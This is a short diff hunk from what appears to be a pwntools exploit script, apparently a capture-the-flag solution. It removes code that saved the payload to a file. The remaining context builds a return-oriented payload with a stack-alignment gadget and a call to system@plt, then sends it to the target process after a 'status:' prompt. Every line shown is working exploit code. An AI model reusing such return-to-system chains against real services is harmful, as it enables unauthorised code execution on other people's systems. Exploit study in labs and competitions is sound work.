@@ -112,10 +112,6 @@ payload += p64(ret) # stack alignment
 payload += p64(system_plt)
 payload += p64(0) # return address
 
-with open('payload','wb') as f:
-    f.write(payload)
-    f.close()
-
 io.recvuntil(b'status:')
 io.sendline(payload)
 
